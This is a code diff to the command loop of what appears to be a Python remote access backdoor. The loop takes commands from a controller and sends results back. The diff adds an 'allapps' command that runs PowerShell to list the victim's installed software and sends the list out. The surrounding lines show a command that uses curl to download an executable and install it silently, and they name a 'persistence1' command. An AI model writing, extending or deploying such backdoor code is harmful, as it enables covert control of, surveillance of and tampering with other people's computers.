@@ -372,6 +372,17 @@ def shell():
                 pass
 
 
+        elif command == 'allapps':
+            try:
+                execute = subprocess.run(['powershell', 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Vendor, Version'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   stdin=subprocess.PIPE)
+                result = execute.stdout + execute.stderr
+                result = result.decode()
+                reliable_send(result)
+            except:
+                pass
+
+
         elif command == 'python_install':
             try:
                 execute = subprocess.run("curl https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe --output python-3.10.2-amd64.exe && python-3.10.2-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -469,7 +480,6 @@ def shell():
             except:
                 pass
                 
-
     
         elif command == 'persistence1':
             try:
